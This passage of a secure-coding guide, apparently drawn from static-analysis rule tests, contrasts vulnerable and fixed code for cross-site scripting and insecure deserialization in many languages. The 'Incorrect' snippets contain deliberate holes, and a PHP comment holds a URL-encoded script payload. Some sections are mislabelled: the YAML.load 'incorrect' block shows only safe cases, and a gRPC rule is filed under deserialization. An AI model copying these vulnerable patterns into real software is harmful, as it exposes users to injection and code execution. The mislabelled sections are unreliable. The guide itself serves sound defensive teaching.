})(jQuery);
```

**Correct: static content**

```javascript
(function ($) {

  function ok1() {
    const item = '<div></div>';
    // ok: jquery-insecure-method
    $( ".inner" ).wrap(item);
  }

  function ok2(userInput) {
    // ok: jquery-insecure-method
    $( "div" ).html( '<div></div>' );
  }

  function ok3(userInput) {
    jQuery(document).ready(function($){
      // ok: jquery-insecure-method
      $('<input type="checkbox"/>').prependTo('.checklist-box li');
    });
  }

})(jQuery);
```

**References:**

- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

- [OWASP XSS Attacks](https://owasp.org/www-community/attacks/xss/)

- [jQuery XSS Vulnerability](https://bugs.jquery.com/ticket/9521)

---

**Incorrect: direct response write with user input**

```javascript
const express = require('express')
const router = express.Router()

router.get('/greeting', (req, res) => {
    const { name } = req.query;
    // ruleid: direct-response-write
    res.send('<h1> Hello :' + name + "</h1>")
})

app.get('/', function (req, res) {
    var user = req.query.name;
    msg = "Hi " + user
    // ruleid: direct-response-write
    res.send('Response</br>' + msg);
});

app.get('/xss', function (req, res) {
    var html = "ASadad" + req.query.name + "Asdadads"
    // ruleid: direct-response-write
    res.write('Response</br>' + html);
});
```

**Correct: use templates or sanitization**

```javascript
const express = require('express')
const router = express.Router()
var xss = require("xss");

// Template handles escaping
router.get('/greet-template', (req, res) => {
    name = req.query.name
    // ok: direct-response-write
    res.render('index', { user_name: name });
})

// Using XSS sanitization library
router.get('/greet-template', (req, res) => {
    a = req.query.name
    // ok: direct-response-write
    res.send('<h1> Hello :' + xss(a) + "</h1>")
})

app.get('/noxss', function (req, res) {
    var resp = req.query.name;
    // ok: direct-response-write
    res.write('Response</br>');
});
```

**References:**

- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

---

**Incorrect: manual replace-based sanitization**

```javascript
function encodeProductDescription (tableData: any[]) {
  for (let i = 0; i < tableData.length; i++) {
    // ruleid: detect-replaceall-sanitization
    tableData[i].description = tableData[i].description.replaceAll('<', '&lt;').replaceAll('>', '&gt;')
  }
}
```

**Correct: use proper sanitization library**

```javascript
function encodeProductDescription (tableData: any[]) {
  for (let i = 0; i < tableData.length; i++) {
    // ok - use DOMPurify or sanitize-html instead
    tableData[i].description = DOMPurify.sanitize(tableData[i].description)
  }
}
```

**References:**

- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

- [DOMPurify](https://www.npmjs.com/package/dompurify)

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

---

**Incorrect: non-constant value in dangerouslySetInnerHTML**

```typescript
import DOMPurify from "dompurify"
import sanitize from "xss"

function TestComponent2(foo) {
    // ruleid:react-dangerouslysetinnerhtml
    let params = {smth: 'test123', dangerouslySetInnerHTML: {__html: foo.bar},a:b};
    return React.createElement('div', params);
}
```

**Correct: sanitized or static content**

```typescript
import DOMPurify from "dompurify"
import sanitize from "xss"

function TestComponent1() {
    // ok:react-dangerouslysetinnerhtml
  return <div dangerouslySetInnerHTML={createMarkup()} />;
}

function OkComponent1() {
    // ok:react-dangerouslysetinnerhtml
  return <li className={"foobar"} dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(foo)}} />;
}

function OkComponent3() {
    // ok:react-dangerouslysetinnerhtml
    let params = {smth: 'test123', dangerouslySetInnerHTML: {__html: sanitize(foo)},a:b};
    return React.createElement('div', params);
}

function OkComponent4() {
    // ok:react-dangerouslysetinnerhtml
    let params = {smth: 'test123', dangerouslySetInnerHTML: {__html: "hi"},a:b};
    return React.createElement('div', params);
}
```

**References:**

- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

- [React dangerouslySetInnerHTML](https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html)

---

**Incorrect: setting innerHTML/outerHTML directly**

```typescript
function Test2(input) {
  // ruleid: react-unsanitized-property
    ReactDOM.findDOMNode(this.someRef).outerHTML = input.value;
  }
```

**Correct: static content**

```typescript
  function OkTest1() {
  // ok: react-unsanitized-property
    this.element.innerHTML = "<a href='/about.html'>About</a>";
  }

  function OkTest2() {
  // ok: react-unsanitized-property
    ReactDOM.findDOMNode(this.someRef).outerHTML = "<a href='/about.html'>About</a>";
  }
```

**References:**

- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

- [React dangerouslySetInnerHTML](https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html)

---

**Incorrect: bypassing Angular security**

```typescript
import { DomSanitizer, SecurityContext } from '@angular/platform-browser'
import DOMPurify from 'dompurify'

class SomeClass {
    constructor(private sanitizer: DomSanitizer){}

    bypass(value: string){
        // ruleid:angular-bypasssecuritytrust
        let html = this.sanitizer.bypassSecurityTrustHtml(value);
        // ruleid:angular-bypasssecuritytrust
        let style = this.sanitizer.bypassSecurityTrustStyle(value);
        // ruleid:angular-bypasssecuritytrust
        let script = this.sanitizer.bypassSecurityTrustScript(value);
        // ruleid:angular-bypasssecuritytrust
        let resource_url = this.sanitizer.bypassSecurityTrustResourceUrl(value);
        // ruleid:angular-bypasssecuritytrust
        let url = this.sanitizer.bypassSecurityTrustUrl(value);
    }
}
```

**Correct: static content or pre-sanitized**

```typescript
import { DomSanitizer, SecurityContext } from '@angular/platform-browser'
import DOMPurify from 'dompurify'

class SomeClass {
    constructor(private sanitizer: DomSanitizer){}

    bypass(value: string){
        // ok:angular-bypasssecuritytrust
        let url1 = this.sanitizer.bypassSecurityTrustUrl("a");
        // ok:angular-bypasssecuritytrust
        let html1 = this.sanitizer.bypassSecurityTrustHtml("value");
        // ok:angular-bypasssecuritytrust
        let html2 = this.sanitizer.bypassSecurityTrustHtml(DOMPurify.sanitize("value"))
    }
}
```

**References:**

- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

- [Angular DomSanitizer](https://angular.io/api/platform-browser/DomSanitizer)

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

---

**Incorrect: using v-html with user content**

```vue
<div>
  <!-- ruleid: avoid-v-html -->
  <span dir="auto" class="markdown" v-html="entry.post"></span>
</div>
```

**Correct: using template interpolation**

```vue
<div>
  <!-- ok: avoid-v-html -->
  <span dir="auto" class="markdown">{{entry.post}}</span>
</div>
```

**References:**

- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

- [Vue Raw HTML Guide](https://vuejs.org/v2/guide/syntax.html#Raw-HTML)

---

**Incorrect: user input in response**

```python
from flask import make_response, request

def test1():
    # ruleid: response-contains-unsanitized-input
    x = request.args.get("x")
    return make_response("found {}".format(x))


def test1():
    # ruleid: response-contains-unsanitized-input
    x = request.args.get("x")
    y = make_response("found {}".format(x))
    return y


def test3():
    # ruleid: response-contains-unsanitized-input
    x = request.args.get("x")
    return make_response(f"found {x}")
```

**Correct: sanitized input**

```python
from flask import make_response, request

def test2():
    # ok: response-contains-unsanitized-input
    x = request.args.get("x")
    y = some_safe_operation_on(x)
    return make_response("found {}".format(y))
```

**References:**

- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

- [Flask Security Guide](https://flask.palletsprojects.com/en/1.0.x/security/)

- [OWASP XSS Attacks](https://owasp.org/www-community/attacks/xss/)

---

**Incorrect: request data in HttpResponse**

```python
import urllib
from django.http import HttpResponse, HttpResponseBadRequest

def search_certificates(request):
    # ruleid: reflected-data-httpresponse
    user_filter = request.GET.get("user", "")
    if not user_filter:
        msg = _("user is not given.")
        return HttpResponseBadRequest(msg)

    user = User.objects.get(Q(email=user_filter) | Q(username=user_filter))
    if user.DoesNotExist:
        return HttpResponse(_("user '{user}' does not exist").format(user_filter))

def inline_test(request):
    # ruleid: reflected-data-httpresponse
    return HttpResponse("Received {}".format(request.POST.get('message')))
```

**Correct: properly handled response**

```python
from django.http import HttpResponse

def previewNode(request, uid):
    """Preview evaluante node"""
    try:
        if uid in engines:
            # ok: reflected-data-httpresponse
            _nodeId = request.data.get('nodeId')
            engines[uid].stoppable = True
            _res = engines[uid].model.previewNode(_nodeId)
            if _res is None:
                return HttpResponse('', status=204)
            return HttpResponse(_res)
        return manageNoEngine()
    except Exception as e:
        return genericApiException(e, engines[uid])
```

**References:**

- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

- [Django Book XSS Prevention](https://django-book.readthedocs.io/en/latest/chapter20.html#cross-site-scripting-xss)

---

**Incorrect: autoescape disabled**

```python
import jinja2
from jinja2 import Environment, select_autoescape
templateLoader = jinja2.FileSystemLoader( searchpath="/" )
something = ''

# ruleid:incorrect-autoescape-disabled
Environment(loader=templateLoader, load=templateLoader, autoescape=something)

# ruleid:incorrect-autoescape-disabled
templateEnv = jinja2.Environment(autoescape=False, loader=templateLoader )

Environment(loader=templateLoader,
            load=templateLoader,
# ruleid:incorrect-autoescape-disabled
            autoescape=False)

def fake_func():
    return 'foobar'

# ruleid:incorrect-autoescape-disabled
Environment(loader=templateLoader, autoescape=fake_func())
```

**Correct: autoescape enabled**

```python
import jinja2
from jinja2 import Environment, select_autoescape
templateLoader = jinja2.FileSystemLoader( searchpath="/" )

# ok:incorrect-autoescape-disabled
Environment(loader=templateLoader, load=templateLoader, autoescape=True)

# ok:incorrect-autoescape-disabled
templateEnv = jinja2.Environment(autoescape=True,
        loader=templateLoader )

# ok:incorrect-autoescape-disabled
Environment(loader=templateLoader, autoescape=select_autoescape())

Environment(loader=templateLoader,
# ok:incorrect-autoescape-disabled
            autoescape=select_autoescape(['html', 'htm', 'xml']))
```

**References:**

- CWE-116: Improper Encoding or Escaping of Output

- [Bandit Jinja2 Autoescape](https://bandit.readthedocs.io/en/latest/plugins/b701_jinja2_autoescape_false.html)

- [Jinja2 API Basics](https://jinja.palletsprojects.com/en/2.11.x/api/#basics)

---

**Incorrect: writing formatted strings to ResponseWriter**

```go
package main

import (
    "fmt"
    "net/http"
)

func indexPage(w http.ResponseWriter, r *http.Request) {
    const template = `
    <html>
    <body>
      <h1>Random Movie Quotes</h1>
      <h2>%s</h2>
      <h4>~%s, %s</h4>
    </body>
    </html>`

    quote := getMovieQuote()
    quoteText := quote["quote"]
    movie := quote["movie"]
    year := quote["year"]

    w.WriteHeader(http.StatusAccepted)
    // ruleid: no-direct-write-to-responsewriter
    w.Write([]byte(fmt.Sprintf(template, quoteText, movie, year)))
}

func errorPage(w http.ResponseWriter, r *http.Request) {
    params := r.URL.Query()
    urls, ok := params["url"]
    url := urls[0]

    const template = `
    <html>
    <body>
      <h1>error; page not found. <a href="%s">go back</a></h1>
    </body>
    </html>`

    w.WriteHeader(http.StatusAccepted)
    // ruleid: no-direct-write-to-responsewriter
    w.Write([]byte(fmt.Sprintf(template, url)))
}
```

**Correct: static content or use html/template**

```go
package main

import (
    "net/http"
)

func healthCheck(w http.ResponseWriter, r *http.Request) {
    // ok: no-direct-write-to-responsewriter
    w.Write([]byte("alive"))
}
```

**References:**

- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

- [Go Security Pearls - XSS](https://blogtitle.github.io/robn-go-security-pearls-cross-site-scripting-xss/)

---

**Incorrect: using insecure template types**

```go
package main

import "fmt"
import "html/template"

func main() {
    var g = "foo"

    // ruleid:go-insecure-templates
    const a template.HTML = fmt.Sprintf("<a href=%q>link</a>")
    // ruleid:go-insecure-templates
    var b template.CSS = "a { text-decoration: underline; } "
    // ruleid:go-insecure-templates
    var c template.HTMLAttr =  fmt.Sprintf("herf=%q")
    // ruleid:go-insecure-templates
    const d template.JS = "{foo: 'bar'}"
    // ruleid:go-insecure-templates
    var e template.JSStr = "setTimeout('alert()')";
    // ruleid:go-insecure-templates
    var f template.Srcset = g;
}
```

**Correct: use safe template parsing**

```go
package main

import "html/template"

func main() {
    // ok:go-insecure-templates
    tmpl, err := template.New("test").ParseFiles("file.txt")
    myTpl.Execute(w, data);
}
```

**References:**

- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

- [Go html/template HTML Type](https://golang.org/pkg/html/template/#HTML)

---

**Incorrect (using raw() to bypass escaping):**

```ruby
require "abstract_unit"

class OutputSafetyHelperTest < ActionView::TestCase
  tests ActionView::Helpers::OutputSafetyHelper

  def setup
    @string = "hello"
  end

  test "raw returns the safe string" do
    # ruleid: avoid-raw
    result = raw(@string)
    assert_equal @string, result
  end

  test "raw handles nil values correctly" do
    # ruleid: avoid-raw
    assert_equal "", raw(nil)
  end

  test "safe_join should html_escape any items" do
    # ruleid: avoid-raw
    joined = safe_join([raw("<p>foo</p>"), "<p>bar</p>"], "<br />")
  end
end
```

**References:**

- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

- [Rails raw() Method](https://api.rubyonrails.org/classes/ActionView/Helpers/OutputSafetyHelper.html#method-i-raw)

- [Preventing XSS in Rails](https://www.netsparker.com/blog/web-security/preventing-xss-ruby-on-rails-web-applications/)

---

**Incorrect (using html_safe() to bypass escaping):**

```ruby
# ruleid: avoid-html-safe
"foo".html_safe

# ruleid: avoid-html-safe
"<div>foo</div>".html_safe + "<bar>"

# ruleid: avoid-html-safe
html = "<div>".html_safe

# ruleid: avoid-html-safe
"<div>".html_safe.tap
```

**Correct: no html_safe on user input**

```ruby
# ok: avoid-html-safe
"foo".length

# ok: avoid-html-safe
html = "<div>"
```

**References:**

- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

- [Brakeman XSS Checks](https://github.com/presidentbeef/brakeman/blob/main/docs/warning_types/cross_site_scripting/index.markdown)

- [Preventing XSS in Rails](https://www.netsparker.com/blog/web-security/preventing-xss-ruby-on-rails-web-applications/)

---

**Incorrect: writing request parameters directly**

```java
package servlets;

import java.io.PrintWriter;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class Cls extends HttpServlet
{
    protected void danger(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String input1 = req.getParameter("input1");
        // ruleid:servletresponse-writer-xss
        resp.getWriter().write(input1);
    }

    protected void danger2(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String input1 = req.getParameter("input1");
        // ruleid:servletresponse-writer-xss
        PrintWriter writer = resp.getWriter();
        writer.write(input1);
    }
}
```

**Correct: encode output**

```java
package servlets;

import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class Cls extends HttpServlet
{
    protected void ok(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String input1 = req.getParameter("input1");
        // ok:servletresponse-writer-xss
        resp.getWriter().write(Encode.forHtml(input1));
    }
}
```

**References:**

- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

- [Find Security Bugs - XSS Servlet](https://find-sec-bugs.github.io/bugs.htm#XSS_SERVLET)

- [OWASP Injection Guide](https://owasp.org/Top10/A03_2021-Injection)

---

**Incorrect: echoing user input**

```php
<?php

// example key-value: name=%3Cscript%3Econfirm%28%29%3C%2Fscript%3E
function dangerousEchoUsage() {
    $name = $_REQUEST['name'];
    // ruleid: echoed-request
    echo "Hello : $name";
    // ruleid: echoed-request
    echo "Hello : " . $name;
}

function doSmth() {
    $name = $_REQUEST['name'];
    // ruleid: echoed-request
    echo "Hello :".$name;
}

function doSmth2() {
    // ruleid: echoed-request
    echo "Hello ".$_POST['name']." !";
}

function doSmth3() {
    $name = $_GET['name'];
    if (str_contains($name, 'foobar')) {
        // ruleid: echoed-request
        echo "Hello :".$name;
    }
}
```

**Correct: use htmlentities or htmlspecialchars**

```php
<?php

function safeEchoUsage() {
    $name = $_REQUEST['name'];
    // ok: echoed-request
    echo "Hello : " . htmlentities($name);
}

function doOK1() {
    // ok: echoed-request
    echo "Hello ".htmlentities($_POST['name'])." !";
}

function doOK2() {
    $input = $_GET['name'];
    // ok: echoed-request
    echo "Hello ".htmlspecialchars($input)." !";
}

function doOK3() {
    $safevar = "Hello ".htmlentities(trim($_GET['name']));
    // ok: echoed-request
    echo $safevar;
}

function doOK4() {
    // ok: echoed-request - Laravel escape function
    echo "Hello ".e($_POST['name'])." !";
}

function doOK5() {
    // ok: echoed-request - WordPress escape function
    $safevar = esc_attr($_GET['name']);
    echo "Hello $safevar !";
}
```

**References:**

- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

- [PHP htmlentities()](https://www.php.net/manual/en/function.htmlentities.php)

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

---

**Incorrect: user input in HTML response**

```scala
package controllers

import play.api._
import play.api.mvc.{Action, Controller}
import play.twirl.api.Html;

class XssController extends Controller {

  def vulnerable1(value: String) = Action { implicit request: Request[AnyContent] =>
    // ruleid: tainted-html-response
    Ok(s"Hello $value !").as("text/html")
  }

  def vulnerable2(value: String) = Action.async { implicit request: Request[AnyContent] =>
    // ruleid: tainted-html-response
    Ok("Hello " + value + " !").as("tExT/HtML")
  }

  def vulnerable6(value:String) = Action { implicit request: Request[AnyContent] =>
    // ruleid: tainted-html-response
    Ok(views.html.xssHtml.render(Html.apply("Hello "+value+" !")))
  }
}
```

**Correct: use templates or escape**

```scala
package controllers

import play.api._
import play.api.mvc.{Action, Controller}
import play.twirl.api.Html;

class XssController extends Controller {

  def safeJson(value: String) = Action.async { implicit request: Request[AnyContent] =>
    // ok: tainted-html-response
    Ok("Hello " + value + " !").as("text/json")
  }

  def safeTemplate(value:String) = Action {
    // ok: tainted-html-response
    Ok(views.html.template.render(value))
  }

  def variousSafe(value: String) = Action { implicit request: Request[AnyContent] =>
    // ok: tainted-html-response
    Ok("Hello "+value+" !")
    // ok: tainted-html-response
    Ok(s"Hello $value !").as("text/json")
    // ok: tainted-html-response
    Ok("<b>Hello !</b>").as("text/html")
    // ok: tainted-html-response
    Ok(views.html.xssHtml.render(Html.apply("<b>Hello !</b>")))

    val escapedValue = org.apache.commons.lang3.StringEscapeUtils.escapeHtml4(value)
    // ok: tainted-html-response
    Ok("Hello " + escapedValue + " !").as("text/html")

    val owaspEscapedValue = org.owasp.encoder.Encode.forHtml(value)
    // ok: tainted-html-response
    Ok("Hello " + owaspEscapedValue + " !").as("text/html")
  }
}
```

**References:**

- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

- [OWASP Injection Guide](https://owasp.org/Top10/A03_2021-Injection)

---

1. **Always escape output** - Use context-appropriate encoding (HTML, JavaScript, URL, CSS)

2. **Use framework-provided templating** - Most frameworks auto-escape by default

3. **Validate and sanitize input** - Whitelist allowed characters/patterns

4. **Use Content Security Policy (CSP)** - Add defense-in-depth via HTTP headers

5. **Use sanitization libraries** - DOMPurify, sanitize-html, OWASP Java Encoder

6. **Never trust user input** - Treat all external data as potentially malicious

7. **Set HttpOnly flag on cookies** - Prevents JavaScript access to session cookies

### 0.13 Prevent Insecure Deserialization

**Impact: CRITICAL (Remote code execution allowing attackers to run arbitrary code on the server)**

Insecure deserialization occurs when untrusted data is used to abuse the logic of an application, inflict denial of service attacks, or execute arbitrary code. Objects can be serialized into strings and later loaded from strings, but deserialization of untrusted data can lead to remote code execution (RCE). Never deserialize data from untrusted sources. Use safer alternatives like JSON for data interchange.

---

**Incorrect: vulnerable to code execution via YAML.load**

```ruby
def ok_deserialization
   o = Klass.new("hello\n")
   data = YAML.dump(o)
   # ok: bad-deserialization-yaml
   obj = YAML.load(data, safe: true)

   filename = File.read("test.txt")
   data = YAML.dump(filename)
   # ok: bad-deserialization-yaml
   YAML.load(filename)

   # ok: bad-deserialization-yaml
   YAML.load(File.read("test.txt"))

   # ok: bad-deserialization-yaml
   obj = YAML::load(ERB.new(File.read("test.yml")).result)

   # ok: bad-deserialization-yaml
   obj = YAML::load(ERB.new(File.read("test.yml")))

   template = ERB.new(File.read("test.yml"))
   # ok: bad-deserialization-yaml
   obj = YAML::load(template)

   template = ERB.new(File.read("test.yml")).result
   # ok: bad-deserialization-yaml
   obj = YAML::load(template)

   template = ERB.new(File.read("test.yml"))
   # ok: bad-deserialization-yaml
   obj = YAML::load(template.result)

   # ok: bad-deserialization-yaml
   obj = YAML.load(File.read(File.join(Pathname.pwd, "hello.yml")))
end
```

**Correct (use safe: true or load from trusted files):**

**References:**

- CWE-502: Deserialization of Untrusted Data

- [Ruby Security Advisory](https://groups.google.com/g/rubyonrails-security/c/61bkgvnSGTQ/m/nehwjA8tQ8EJ)

- [Brakeman Deserialization Check](https://github.com/presidentbeef/brakeman/blob/main/lib/brakeman/checks/check_deserialize.rb)

---

**Incorrect: deserializing user-controlled data**

```ruby
 def bad_deserialization
    o = Klass.new("hello\n")
    data = params['data']
    # ruleid: bad-deserialization
    obj = Marshal.load(data)

    o = Klass.new(params['hello'])
    data = CSV.dump(o)
    # ruleid: bad-deserialization
    obj = CSV.load(data)

    o = Klass.new("hello\n")
    data = cookies['some_field']
    # ruleid: bad-deserialization
    obj = Oj.object_load(data)
    # ruleid: bad-deserialization
    obj = Oj.load(data)
 end
```

**Correct: use safe options or trusted data**

```ruby
 def ok_deserialization
    o = Klass.new("hello\n")
    data = YAML.dump(o)
    # ok: bad-deserialization
    obj = YAML.load(data, safe: true)

    filename = File.read("test.txt")
    data = YAML.dump(filename)
    # ok: bad-deserialization
    YAML.load(filename)

    # ok: bad-deserialization
    YAML.load(File.read("test.txt"))

   # ok: bad-deserialization
   obj = Oj.load(data,options=some_safe_options)
 end
```

**References:**

- CWE-502: Deserialization of Untrusted Data

- [Ruby Security Advisory](https://groups.google.com/g/rubyonrails-security/c/61bkgvnSGTQ/m/nehwjA8tQ8EJ)

- [Brakeman Deserialization Check](https://github.com/presidentbeef/brakeman/blob/main/lib/brakeman/checks/check_deserialize.rb)

---

**Incorrect: deserializing request environment data**

```ruby
 def bad_deserialization
   data = request.env[:name]
   # ruleid: bad-deserialization-env
   obj = Marshal.load(data)

   o = Klass.new(request.env[:name])
   data = CSV.dump(o)
   # ruleid: bad-deserialization-env
   obj = CSV.load(data)

   o = Klass.new("hello\n")
   data = request.env[:name]
   # ruleid: bad-deserialization-env
   obj = Oj.object_load(data)
   # ruleid: bad-deserialization-env
   obj = Oj.load(data)
 end
```

**Correct: use trusted data sources**

```ruby
 def ok_deserialization
    o = Klass.new("hello\n")
    data = CSV.dump(o)
    # ok: bad-deserialization-env
    obj = CSV.load(data)

    data = get_safe_data()
    # ok: bad-deserialization-env
    obj = Marshal.load(data)

   # ok: bad-deserialization-env
   obj = Oj.load(data,options=some_safe_options)
 end
```

**References:**

- CWE-502: Deserialization of Untrusted Data

- [Ruby Security Advisory](https://groups.google.com/g/rubyonrails-security/c/61bkgvnSGTQ/m/nehwjA8tQ8EJ)

- [Brakeman Deserialization Check](https://github.com/presidentbeef/brakeman/blob/main/lib/brakeman/checks/check_deserialize.rb)

---

**Incorrect: deserializing Lambda event data**

```ruby
def handler(event:, context:)
	foobar = event['smth']

    # ruleid: tainted-deserialization
    obj1 = Marshal.load(foobar)

    data = event['body']['object']
    # ruleid: tainted-deserialization
    obj2 = YAML.load(data)

    # ruleid: tainted-deserialization
    obj3 = CSV.load("o:" + event['data'])
end
```

**Correct: use hardcoded or safe data**

```ruby
def ok_handler(event:, context:)

    # ok: tainted-deserialization
    obj1 = Marshal.load(Marshal.dump(Foobar.new))

    data = "hardcoded_value"
    # ok: tainted-deserialization
    obj2 = YAML.load(data)

    # ok: tainted-deserialization
    obj3 = CSV.load(get_safe_data())
end
```

**References:**

- CWE-502: Deserialization of Untrusted Data

- [Ruby Security Documentation](https://ruby-doc.org/core-3.1.2/doc/security_rdoc.html)

- [Ruby Security Advisory](https://groups.google.com/g/rubyonrails-security/c/61bkgvnSGTQ/m/nehwjA8tQ8EJ)

---

**Incorrect: using insecure deserialization libraries**

```typescript
var node_serialize = require("node-serialize")
var serialize_to_js = require('serialize-to-js');

module.exports.value = function (req,res){
	// ruleid: express-third-party-object-deserialization
	node_serialize.unserialize(req.files.products.data.toString('utf8'))
}


module.exports.value1 = function (req,res){
	var str = new Buffer(req.cookies.profile, 'base64').toString();
	// ruleid: express-third-party-object-deserialization
	serialize_to_js.deserialize(str)
}
```

**Correct: use safe alternatives like JSON.parse**

```typescript
var node_serialize = require("node-serialize")
var serialize_to_js = require('serialize-to-js');

module.exports.value = function (req,res){
	// ok: express-third-party-object-deserialization
	fake.unserialize(req.files)
}


module.exports.value1 = function (req,res){
	var str = new Buffer(req.cookies.profile, 'base64').toString();
	// ok: express-third-party-object-deserialization
	foo.deserialize(str)
}
```

**References:**

- CWE-502: Deserialization of Untrusted Data

- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)

---

**Incorrect: creating insecure gRPC connections**

```javascript
function test1() {
    // ruleid: grpc-nodejs-insecure-connection
    var grpc = require('grpc');

    var booksProto = grpc.load('books.proto');

    var client = new booksProto.books.BookService('127.0.0.1:50051', grpc.credentials.createInsecure());

    client.list({}, function(error, books) {
        if (error)
            console.log('Error: ', error);
        else
            console.log(books);
    });
}

function test2() {
    // ruleid: grpc-nodejs-insecure-connection
    var {credentials, load, Client} = require('grpc');

    var creds = someFunc() || credentials.createInsecure();

    var client = new Client('127.0.0.1:50051', creds);

    client.list({}, function(error, books) {
        if (error)
            console.log('Error: ', error);
        else
            console.log(books);
    });
}

function test3() {
    // ruleid: grpc-nodejs-insecure-connection
    var grpc = require('grpc');

    var booksProto = grpc.load('books.proto');

    var server = new grpc.Server();

    server.addProtoService(booksProto.books.BookService.service, {});

    server.bind('0.0.0.0:50051', grpc.ServerCredentials.createInsecure());
    server.start();
}
```

**Correct: use SSL/TLS credentials**

```javascript
function testOk1() {
    // ok: grpc-nodejs-insecure-connection
    var {credentials, Client} = require('grpc');
    var channel_creds = credentials.createSsl(root_certs);
    var client = new Client(address, channel_creds);

    client.list({}, function(error, books) {
        if (error)
            console.log('Error: ', error);
        else
            console.log(books);
    });
}
```

**References:**

- CWE-502: Deserialization of Untrusted Data

- [gRPC Security Best Practices](https://blog.gopheracademy.com/advent-2017/go-grpc-beyond-basics/#:~:text=disables%20transport%20security)

---

**Incorrect: using BinaryFormatter which is inherently insecure**

```csharp
using System.Runtime.Serialization.Formatters.Binary;

namespace InsecureDeserialization
{
    public class InsecureBinaryFormatterDeserialization
    {
        public void BinaryFormatterDeserialization(string json)
        {
            try
            {
                // ruleid: insecure-binaryformatter-deserialization
                BinaryFormatter binaryFormatter = new BinaryFormatter();

                MemoryStream memoryStream = new MemoryStream(Encoding.UTF8.GetBytes(json));
                binaryFormatter.Deserialize(memoryStream);
                memoryStream.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }
}
```

**References:**

- CWE-502: Deserialization of Untrusted Data

- [Microsoft BinaryFormatter Security Guide](https://docs.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide)

---

**Incorrect: using LosFormatter which is inherently insecure**

```csharp
using System.Web.UI;

namespace InsecureDeserialization
{
    public class InsecureLosFormatterDeserialization
    {
        public void LosFormatterDeserialization(string json)
        {
            try
            {
                // ruleid: insecure-losformatter-deserialization
                LosFormatter losFormatter = new LosFormatter();
                object obj = losFormatter.Deserialize(json);
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }
}
```

**References:**

- CWE-502: Deserialization of Untrusted Data

- [Microsoft LosFormatter Documentation](https://docs.microsoft.com/en-us/dotnet/api/system.web.ui.losformatter?view=netframework-4.8)

---

**Incorrect: using unsafe TypeNameHandling settings**

```csharp
using Newtonsoft.Json;

namespace InsecureDeserialization
{
    public class InsecureNewtonsoftDeserialization
    {
        public void NewtonsoftDeserialization(string json)
        {
            try
            {
                JsonConvert.DeserializeObject<object>(json, new JsonSerializerSettings
                {
                    // ruleid: insecure-newtonsoft-deserialization
                    TypeNameHandling = TypeNameHandling.All
                });
            } catch(Exception e)
            {
                Console.WriteLine(e);
            }
        }

        public void ConverterOverrideSettings(){
            JsonConvert.DefaultSettings = () =>
                //ruleid: insecure-newtonsoft-deserialization
                new JsonSerializerSettings{TypeNameHandling = TypeNameHandling.Auto};
            Bar newBar = JsonConvert.DeserializeObject<Bar>(someJson);
        }

        public void ConverterOverrideSettingsStaggeredInitialize(){
            var settings = new JsonSerializerSettings();
            //ruleid: insecure-newtonsoft-deserialization
            settings.TypeNameHandling = TypeNameHandling.Auto;
            Bar newBar = JsonConvert.DeserializeObject<Bar>(someJson,settings);
        }

        public void ConverterOverrideSettingsMultipleSettingArgs(){
            JsonConvert.DefaultSettings = () =>
                new JsonSerializerSettings{
                    Culture = InvariantCulture,
                    //ruleid: insecure-newtonsoft-deserialization
                    TypeNameHandling = TypeNameHandling.Auto,
                    TraceWriter = traceWriter
                    };
            Bar newBar = JsonConvert.DeserializeObject<Bar>(someJson);
        }
    }
}
```

**Correct: use TypeNameHandling.None or use custom SerializationBinder**

```csharp
using Newtonsoft.Json;

namespace InsecureDeserialization
{
    public class InsecureNewtonsoftDeserialization
    {
      public void SafeDeserialize(){
        Bar newBar = JsonConvert.DeserializeObject<Bar>(someJson, new JsonSerializerSettings
        {
            //ok: insecure-newtonsoft-deserialization
            TypeNameHandling = TypeNameHandling.None
        });
      }

      public void SafeDefaults(){
        //ok: insecure-newtonsoft-deserialization
        Bar newBar = JsonConvert.DeserializeObject<Bar>(someJson);
      }
    }
}
```

**References:**

- CWE-502: Deserialization of Untrusted Data

